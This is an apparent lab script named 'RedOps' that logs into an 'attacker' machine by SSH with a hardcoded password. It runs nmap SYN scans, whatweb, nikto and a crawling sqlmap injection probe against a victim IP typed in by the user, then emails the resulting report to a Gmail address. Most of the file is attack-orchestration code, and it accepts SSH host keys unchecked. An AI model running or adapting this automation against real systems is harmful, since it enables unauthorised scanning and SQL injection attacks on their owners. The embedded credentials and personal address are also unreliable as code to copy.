import paramiko
import time
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# === CONFIGURATION === #
ATTACKER_IP = "192.168.1.218"                      # PC2 - RedOps Attack Engine
USERNAME = "redops-attack-engine"                  # Attacker SSH username
PASSWORD = "i"                                     # Attacker SSH password
LOCAL_REPORT = os.path.expanduser("C:\\Users\\ditiss\\Desktop\\Report\\RedOps_Final_Report.txt")

# Email configuration
EMAIL_SENDER = "redops@controller.local"
EMAIL_RECEIVER = "haagduga69@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USERNAME = "your_gmail@gmail.com"            # <-- Replace with your Gmail
SMTP_PASSWORD = "your_gmail_app_password"         # <-- Use app password (not regular Gmail password)

# Offensive tools to verify
OFFENSIVE_TOOLS = [
    "nmap", "sqlmap", "hydra", "metasploit-framework",
    "nikto", "netcat", "john", "gobuster", "curl",
    "sshpass", "python3", "wfuzz", "whatweb", "openvas"
]

# === USER INPUT === #
victim_ip = input("[?] Enter victim IP address: ").strip()
report_remote = f"/tmp/redops_report_{int(time.time())}.txt"

# === FUNCTIONS === #
def check_installed_tools(ssh):
    print("[+] Checking installed offensive tools...")
    found = []
    for tool in OFFENSIVE_TOOLS:
        stdin, stdout, stderr = ssh.exec_command(f"which {tool} || command -v {tool}")
        if stdout.read().decode().strip():
            found.append(tool)
    return found

def run_attacks(ssh):
    print("[+] Running multiple reconnaissance/attack tools...")

    commands = [
        f"echo '--- NMAP SCAN ---' > {report_remote} && nmap -sS -T4 -Pn {victim_ip} >> {report_remote} 2>&1",
        f"echo '--- WHATWEB ---' >> {report_remote} && whatweb http://{victim_ip} >> {report_remote} 2>&1",
        f"echo '--- SQLMAP ---' >> {report_remote} && sqlmap -u http://{victim_ip} --batch --crawl=1 --level=1 --random-agent >> {report_remote} 2>&1",
        f"echo '--- HYDRA (SSH Brute Force Simulated) ---' >> {report_remote} && echo 'Simulated hydra attack (demo)' >> {report_remote}",
        f"echo '--- NIKTO ---' >> {report_remote} && nikto -h http://{victim_ip} >> {report_remote} 2>&1"
    ]

    for cmd in commands:
        print(f"[>] Running: {cmd[:40]}...")
        ssh.exec_command(cmd)
        time.sleep(10)  # adjust for long scans

    print("[+] All attack tools executed.")

def fetch_report(ssh):
    print("[+] Fetching report to base machine...")
    sftp = ssh.open_sftp()
    sftp.get(report_remote, LOCAL_REPORT)
    sftp.close()
    print(f"[✓] Report saved at: {LOCAL_REPORT}")

def send_email_alert(tools_found):
    print("[+] Sending email alert with report...")
    message = MIMEMultipart()
    message["From"] = EMAIL_SENDER
    message["To"] = EMAIL_RECEIVER
    message["Subject"] = "🛡️ RedOps Attack Report & Tool Inventory"

    body = f"""
[+] Offensive Tools Installed on Attacker:

    {', '.join(tools_found)}

[+] Nmap & Recon Scans Done on:
    Victim IP: {victim_ip}

[+] Report File:
    {LOCAL_REPORT}

[+] Time:
    {time.ctime()}
"""
    message.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message.as_string())
        server.quit()
        print("[✓] Email alert sent to AI Controller.")
    except Exception as e:
        print(f"[!] Email failed: {e}")

# === MAIN === #
def main():
    print(f"[+] Connecting to attacker machine: {ATTACKER_IP}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ATTACKER_IP, username=USERNAME, password=PASSWORD, timeout=10)

        tools_found = check_installed_tools(ssh)
        run_attacks(ssh)
        fetch_report(ssh)
        send_email_alert(tools_found)

        ssh.close()

    except Exception as e:
        print(f"[!] SSH Connection or Execution failed: {e}")

if __name__ == "__main__":
    main()
